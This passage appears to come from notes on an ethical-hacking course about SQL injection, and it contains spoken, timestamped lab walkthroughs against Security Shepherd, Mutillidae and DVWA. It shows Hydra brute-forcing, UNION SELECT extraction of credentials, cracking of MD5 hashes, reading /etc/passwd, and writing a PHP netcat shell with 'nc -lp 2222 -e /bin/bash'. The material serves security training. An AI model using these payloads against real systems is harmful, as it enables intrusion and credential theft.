> **[0:34](https://www.linkedin.com/learning/ethical-hacking-sql-injection/finding-the-sql-password?u=76281980&t=34)** We'll use the hydro tool, to attempt to brute force our way in, "hydra,
>
> **[0:41](https://www.linkedin.com/learning/ethical-hacking-sql-injection/finding-the-sql-password?u=76281980&t=41)** - l, Marcus,
>
> **[0:44](https://www.linkedin.com/learning/ethical-hacking-sql-injection/finding-the-sql-password?u=76281980&t=44)** - P", and we'll use a password file, user, share, wordlists, "rockyou.txt", and we'll run that against "127.0.0.1", my SQL service.
>
> **[1:05](https://www.linkedin.com/learning/ethical-hacking-sql-injection/finding-the-sql-password?u=76281980&t=65)** And we can say it's attacking "127.0.0.1" on port 3306, and it very quickly finds that the password is also Marcus.
>
> **[1:15](https://www.linkedin.com/learning/ethical-hacking-sql-injection/finding-the-sql-password?u=76281980&t=75)** If we don't know the username, we can try a list of usernames.
>
> **[1:18](https://www.linkedin.com/learning/ethical-hacking-sql-injection/finding-the-sql-password?u=76281980&t=78)** I have a small file set up called "names.txt", "catnames.txt", and we just have the four in there.
>
> **[1:29](https://www.linkedin.com/learning/ethical-hacking-sql-injection/finding-the-sql-password?u=76281980&t=89)** Let's run them through again.
>
> **[1:32](https://www.linkedin.com/learning/ethical-hacking-sql-injection/finding-the-sql-password?u=76281980&t=92)** In this case, we'll use capital L, "names.txt", and the "-u" to loop around usernames first, and we'll again, use 'rockyou.txt" as our password file, and we found our password for Marcus once again.
>
> **[1:51](https://www.linkedin.com/learning/ethical-hacking-sql-injection/finding-the-sql-password?u=76281980&t=111)** Okay, so like any other service, if we have weak passwords, then we could well be exposed to an SQL breach, even without our attackers resorting to injections.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[SQL]] (4), [[Databases]] (1)
> **File Paths:** rockyou.txt (3), names.txt (2), catnames.txt (1)
> **Env Vars:** sql (4)
> **Ports:** port 3306 (3)
> **Versions:** 127.0.0 (3)
> **Speakers:** - [narrator] (1), - l (1), - p (1)
> **Prerequisites:** set up (1)


### 2. Testing for SQL Injections

[↑ Back to Table of Contents](#table-of-contents)

#### Checking out the Security Shepherd
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=0)** - [Host] The OWASP folks have provided another training tool, which we can use for SQL injections.
>
> **[0:05](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=5)** It's the security shepherd, described on the website here.
>
> **[0:09](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=9)** This comes as a virtual machine and you import it as an appliance into virtual box.
>
> **[0:14](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=14)** I've downloaded and imported it.
>
> **[0:16](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=16)** It's running on IP address ten dot naught dot two dot nineteen and we're ready to go.
>
> **[0:21](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=21)** I'll set my browser to proxy by going to preferences, network settings, and manual proxy configuration.
>
> **[0:35](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=35)** Okay.
>
> **[0:37](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=37)** And I'll start burp suite.
>
> **[0:41](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=41)** I'll switch off proxy interception, and I'll set the target scope to ten dot naught dot two dot nineteen.
>
> **[0:58](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=58)** Okay.
>
> **[1:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=60)** I'll browse to ten dot naught dot two dot nineteen, and I'll accept the risk.
>
> **[1:10](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=70)** And here we have the security shepherd login screen.
>
> **[1:13](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=73)** When you do first start it up, You'll want to log in as admin with the password "password" and submit, and you'll be asked to change the password.
>
> **[1:26](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=86)** Okay. Let's select the admin button and module management and we'll change the module layout.
>
> **[1:35](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=95)** I'll set the configuration to open floor mode and I'll refresh the browser and I'll open all levels.
>
> **[1:49](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=109)** Okay. You may want to log out and register a user account, or you can continue with using the admin account.
>
> **[1:55](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=115)** Let's just get into it and have a look at the challenges.
>
> **[2:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=120)** Now select the third one down, injections.
>
> **[2:05](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=125)** Let's run the first challenge, NoSQL injection one.
>
> **[2:11](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=131)** This is a Mongo DB NoSQL injection.
>
> **[2:13](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=133)** And we can see that we're presented just with a button to press.
>
> **[2:17](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=137)** And when we do, we see Jimmy's gamer ID.
>
> **[2:21](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=141)** However, the challenge is to find Marlo's game ID.
>
> **[2:25](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=145)** We can't do anything at this screen, but let's take a look in burp suite.
>
> **[2:28](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=148)** When we look at the post message, we can see that it's a simple request, which contains data starting with the gamer name equals followed by what we saw as the ID.
>
> **[2:39](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=159)** Let's send this to the repeater and go to the repeater tab and then add a quote to the end of the message and press send.
>
> **[2:54](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=174)** Okay.
>
> **[2:55](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=175)** We can see that we've got a Mongo DB error.
>
> **[2:58](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=178)** This shows that we're able to inject.
>
> **[3:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=180)** Let's try adding to the quote, our normal force true injection or quote a quote equals quote a and send.
>
> **[3:13](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=193)** Okay, we still get an error.
>
> **[3:14](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=194)** So we can't force it to evaluate as true this way.
>
> **[3:18](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=198)** However, if we think this may be executed in a script, then we can try to add a forced return as an injected command and terminate the string as we normally would.
>
> **[3:27](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=207)** There's a number of scripting options to try.
>
> **[3:29](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=209)** And when we add and the inquiry return true, and then we'll add var a equals quote a to finish off the final quote that we expect to be in the message.
>
> **[3:48](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=228)** Okay, let's send that.
>
> **[3:50](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=230)** And this time we get the full set of results.
>
> **[3:53](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=233)** We can stop here and manually extract the information, or we can select action request in browser in original session copy the URL and in our browser tab paste it.
>
> **[4:12](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=252)** And we get the formatted information.
>
> **[4:15](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=255)** We can copy the Marlo gamer ID, paste it and submit it.
>
> **[4:28](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=268)** And we've completed the task.
>
> **[4:31](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=271)** Let's try one more.
>
> **[4:33](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=273)** We'll try SQL injection one.
>
> **[4:36](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=276)** Here we have a form request for an ID.
>
> **[4:39](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=279)** So let's try our normal query again.
>
> **[4:41](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=281)** twenty one or one equals one dash dash and get user.
>
> **[4:51](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=291)** And we found no results.
>
> **[4:53](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=293)** Let's change that to use a double quote, just in case that's the way the expression is and get user.
>
> **[5:02](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=302)** And we've got the results.
>
> **[5:04](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=304)** And our result key with a slight misspelling can be copied and pasted and submit.
>
> **[5:16](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=316)** This is a simple force true injection.
>
> **[5:19](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=319)** We've exploited a couple of the SQL injection features of security shepherd, but there's more to work on, on your SQL injection and indeed on your wider web testing skills.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[SQL]] (4), [[Security]] (3), [[Burp Suite]] (2), [[NoSQL]] (2), [[OWASP]] (1)
> **Env Vars:** sql (4), owasp (1), url (1)
> **CLI Commands:** mongo (2), find (1)
> **UI Navigation:** select the (2), go to (1)
> **Definitions:** is a  (2)
> **Speakers:** - [host] (1)

#### Injecting Mutillidae
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=0)** - [Instructor] Let's take a look at the Metasploitable server.
>
> **[0:03](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=3)** Before we get into SQL, we need to update the database details in Metasploitable.
>
> **[0:08](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=8)** I've logged in and navigated to var/www/mutillidae and will sudo nano config.inc.
>
> **[0:16](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=16)** And I'll go down and change the database name from Metasploit to owasp10, and save that, and we're ready to start.
>
> **[0:31](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=31)** If we run an nmap against port 3306 on Metasploitable, nmap -PS -A 10.0.2.8 -p3306,
>
> **[0:48](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=48)** we find it's open and running MySQL 5.0.51a.
>
> **[0:54](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=54)** The first thing we'll try to do now is access to the SQL server remotely with the default root account.
>
> **[1:01](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=61)** MySQL -h 10.0.2.8 -u root,
>
> **[1:11](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=71)** and we get in.
>
> **[1:12](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=72)** We can now check the databases.
>
> **[1:18](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=78)** Show databases.
>
> **[1:21](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=81)** And let's use MySQL.
>
> **[1:26](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=86)** And look at its tables, show tables.
>
> **[1:33](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=93)** And we'll select user, password from the user table.
>
> **[1:42](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=102)** And we see that we have three users with no password set.
>
> **[1:46](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=106)** Let's connect to Metasploitable and select Mutilidae.
>
> **[1:51](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=111)** And we can look at the OWASP top 10 injection extract data user information.
>
> **[1:58](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=118)** We're presented with a login screen, and we can always try admin, admin, but that doesn't work.
>
> **[2:08](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=128)** So let's now try an injection into the username field.
>
> **[2:12](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=132)** sam or True.
>
> **[2:21](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=141)** And the injection works and we have 16 records listed.
>
> **[2:25](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=145)** Now we included the hash or pound sign at the end of the injection so that the remainder of the query, including the password check is commented out.
>
> **[2:34](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=154)** We could also have used two dashes in place of the hash or pound sign.
>
> **[2:38](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=158)** Let's now try a union and see what we can do with this.
>
> **[2:41](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=161)** Firstly, we need to have the same number of columns as are in the main database, but we don't know how many there are.
>
> **[2:47](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=167)** We can work it out using a special trick with the order by clause.
>
> **[2:53](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=173)** Sam' or True order by 1,
>
> **[3:02](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=182)** and view account details.
>
> **[3:04](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=184)** And as expected, we have the 16 records ordered by the first field.
>
> **[3:09](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=189)** Now let's order it on column two, sam' or True order by 2,
>
> **[3:20](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=200)** and that also works.
>
> **[3:22](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=202)** And we carry on like this, sam' or True order by 3,
>
> **[3:34](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=214)** which works.
>
> **[3:36](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=216)** sam or True order by 4,
>
> **[3:45](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=225)** which works.
>
> **[3:47](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=227)** sam' or True order by 5,
>
> **[3:56](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=236)** which works.
>
> **[3:58](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=238)** sam' or True order by 6,
>
> **[4:08](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=248)** which fails.
>
> **[4:09](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=249)** So we can order on column five, but not on column six.
>
> **[4:13](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=253)** So now we know there are five columns being extracted from the database.
>
> **[4:16](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=256)** Let's try using the union select injection.
>
> **[4:22](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=262)** sam' or True union select 1, 2, 3, 4, 5,
>
> **[4:35](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=275)** and view account details.
>
> **[4:39](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=279)** We now have 17 records, including the bottom 2, 3, 4.
>
> **[4:46](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=286)** So we know we selecting five columns on the selection and printing out columns, two, three, and four.
>
> **[4:55](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=295)** Let's now change our injection, and we can drop some of the sam and the or true and just inject union select, we don't want the first column, but we want to show database, user and version,
>
> **[5:17](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=317)** and we need to put in the fifth column.
>
> **[5:23](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=323)** And we now get out our database owasp10, the user root@localhost and the version of MySQL.
>
> **[5:32](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=332)** So we've injected into the database and we've pulled out database functions.
>
> **[5:38](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=338)** We can retrieve database information using the same technique.
>
> **[5:41](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=341)** Let's see what tables we've got.
>
> **[5:44](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=344)** We can do a union select ignore column one, and we'll now print out table schema and table name,
>
> **[6:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=360)** and we won't worry about column four or five,
>
> **[6:08](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=368)** from information_schema.tables,
>
> **[6:20](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=380)** and view account details.
>
> **[6:23](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=383)** We've got a lot of records found, we have 430 tables, and we can see as we go through them, our user's table in DVWA, our normal user table in MySQL, and we have an accounts table in owasp10.
>
> **[6:45](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=405)** These might all be of interest to us.
>
> **[6:47](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=407)** Let's try that injection again, and this time, we'll say union select column one, and we want to print column name.
>
> **[7:06](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=426)** And we're not interested in printing anything else in columns, three, four, and five.
>
> **[7:11](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=431)** And we're going to print that from information_schema.columns,
>
> **[7:23](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=443)** where, table name equals accounts.
>
> **[7:33](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=453)** And that's the end of our injection.
>
> **[7:37](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=457)** And we have five records found with username and password showing.
>
> **[7:42](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=462)** We can now extract our database contents.
>
> **[7:45](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=465)** Again, run a union select, nothing in column one, username in column two, password in column three, and nothing in column four or five.
>
> **[8:02](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=482)** And we'll extract that from accounts.
>
> **[8:11](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=491)** And we get the credentials with the passwords being in plain text.
>
> **[8:16](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=496)** Let's run the injection again to extract column names this time from the users table in the DVWA database.
>
> **[8:25](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=505)** union select column one, column name, I think columns three, four or five from information_schema.columns,
>
> **[8:53](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=533)** where table name equals users.
>
> **[9:04](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=544)** This time we have six records found, and we can see a user and password column.
>
> **[9:10](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=550)** We can now extract the database contents again.
>
> **[9:12](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=552)** While we don't need to, in this case, sometimes we may only be able to extract a single column.
>
> **[9:17](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=557)** And in that case, we can use the concatenation function.
>
> **[9:20](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=560)** Let's see how we do that.
>
> **[9:26](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=566)** union select, don't worry about column one, and then we'll put concat and, I'll be doing contact twice because I want to concatenate three items.
>
> **[9:41](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=581)** I'll take the user 0X3A hexadecimal 3A, and then concatenate both of those with password.
>
> **[9:52](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=592)** And then I don't worry about columns three, four, or five.
>
> **[9:57](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=597)** Extract those from in this case, dvwa.users.
>
> **[10:10](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=610)** And we've now got the user and password details.
>
> **[10:13](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=613)** And we can see the password column holds password hash.
>
> **[10:17](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=617)** I've put the set of user password information into a file called dvpass.
>
> **[10:25](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=625)** Let's go crack them with John the Ripper.
>
> **[10:29](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=629)** john dvpass, and we'll tell John that the format is raw-MD5.
>
> **[10:38](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=638)** Although John could work that out for himself.
>
> **[10:42](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=642)** And very quickly, we find the passwords.
>
> **[10:45](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=645)** admin's password is password as is smithy's, gordonb is abc123, pablo is letmein, and charley is 1337.
>
> **[10:56](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=656)** And we can show them of John the Ripper and getting them listed.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** database (12), [[MySQL]] (5), [[Databases]] (2), [[SQL]] (1), [[Microsoft SQL Server|Sql server]] (1)
> **CLI Commands:** mysql (5), find (2), sudo (1)
> **Env Vars:** sql (2), dvwa (2), owasp (1), md5 (1)
> **Code Identifiers:** information_schema (3)
> **Versions:** 10.0.2 (2), 5.0 (1)
> **Ports:** port 3306 (1)
> **Speakers:** - [instructor] (1)

#### Deep diving the target with SQLi
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-sql-injection/deep-diving-the-target-with-sqli?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/deep-diving-the-target-with-sqli?u=76281980&t=0)** - Now we know how to use union select to achieve an injection.
>
> **[0:04](https://www.linkedin.com/learning/ethical-hacking-sql-injection/deep-diving-the-target-with-sqli?u=76281980&t=4)** Let's see how we can access operating system functions using the union select clause union select, and we'll use the load file function and we'll ask it to load slash etc, slash password comma.
>
> **[0:32](https://www.linkedin.com/learning/ethical-hacking-sql-injection/deep-diving-the-target-with-sqli?u=76281980&t=32)** No, no.
>
> **[0:33](https://www.linkedin.com/learning/ethical-hacking-sql-injection/deep-diving-the-target-with-sqli?u=76281980&t=33)** And finish our injection.
>
> **[0:38](https://www.linkedin.com/learning/ethical-hacking-sql-injection/deep-diving-the-target-with-sqli?u=76281980&t=38)** And we get one record found, which is the data from our etc password file.
>
> **[0:44](https://www.linkedin.com/learning/ethical-hacking-sql-injection/deep-diving-the-target-with-sqli?u=76281980&t=44)** So now we have a way of listing files.
>
> **[0:47](https://www.linkedin.com/learning/ethical-hacking-sql-injection/deep-diving-the-target-with-sqli?u=76281980&t=47)** We can also store files on the target.
>
> **[0:49](https://www.linkedin.com/learning/ethical-hacking-sql-injection/deep-diving-the-target-with-sqli?u=76281980&t=49)** Let's store some texts in a file in the temp folder, union select.
>
> **[1:02](https://www.linkedin.com/learning/ethical-hacking-sql-injection/deep-diving-the-target-with-sqli?u=76281980&t=62)** This is my test data, 2, 3, 4, 5, and we use into out file slash tmp slash my test.
>
> **[1:26](https://www.linkedin.com/learning/ethical-hacking-sql-injection/deep-diving-the-target-with-sqli?u=76281980&t=86)** Okay.
>
> **[1:28](https://www.linkedin.com/learning/ethical-hacking-sql-injection/deep-diving-the-target-with-sqli?u=76281980&t=88)** And view account details that username or password.
>
> **[1:34](https://www.linkedin.com/learning/ethical-hacking-sql-injection/deep-diving-the-target-with-sqli?u=76281980&t=94)** And if we check on meta sploitable, and in the temp folder.
>
> **[1:40](https://www.linkedin.com/learning/ethical-hacking-sql-injection/deep-diving-the-target-with-sqli?u=76281980&t=100)** And we have a, my test file when we cat my test, this is my test data.
>
> **[1:49](https://www.linkedin.com/learning/ethical-hacking-sql-injection/deep-diving-the-target-with-sqli?u=76281980&t=109)** So the testing file has been created.
>
> **[1:51](https://www.linkedin.com/learning/ethical-hacking-sql-injection/deep-diving-the-target-with-sqli?u=76281980&t=111)** This file can be script code, for example, a PHP file.
>
> **[1:55](https://www.linkedin.com/learning/ethical-hacking-sql-injection/deep-diving-the-target-with-sqli?u=76281980&t=115)** Of course we can't remotely execute PHP code from temp and we can't upload into a web folder from util. Now, what we really want is to be able to write executable strips into a remotely accessible web folder, which if we have a generally available upload folder, we may be able to do so.
>
> **[2:12](https://www.linkedin.com/learning/ethical-hacking-sql-injection/deep-diving-the-target-with-sqli?u=76281980&t=132)** However, let's run the command again, this time uploading a PHP script file and we do union select and we're going to upload is PHP system and, nc minus lp, 2222 minus e slash bin slash bash.
>
> **[2:43](https://www.linkedin.com/learning/ethical-hacking-sql-injection/deep-diving-the-target-with-sqli?u=76281980&t=163)** So that we'll run that cat and listen on port 2, 2, 2, 2, and we'll close that off.
>
> **[2:53](https://www.linkedin.com/learning/ethical-hacking-sql-injection/deep-diving-the-target-with-sqli?u=76281980&t=173)** And 2, 3, 4, 5 into out file slash temp slash net dot PHP and close off our injection.
>
> **[3:15](https://www.linkedin.com/learning/ethical-hacking-sql-injection/deep-diving-the-target-with-sqli?u=76281980&t=195)** And we'll run that.
>
> **[3:19](https://www.linkedin.com/learning/ethical-hacking-sql-injection/deep-diving-the-target-with-sqli?u=76281980&t=199)** And when we look at the temp folder, we can see our net dot PHP file has been uploaded.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[PHP]] (6), data (3), web (2)
> **CLI Commands:** php (6), cat (2)
> **Env Vars:** php (6)
> **Ports:** port 2 (1)
> **Tools:** bash (1)
> **Analogies:** for example (1)
> **Speakers:** - now (1)

#### Cracking the MySQL hash
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-sql-injection/cracking-the-mysql-hash?u=76281980)

> [!transcript]- Transcript
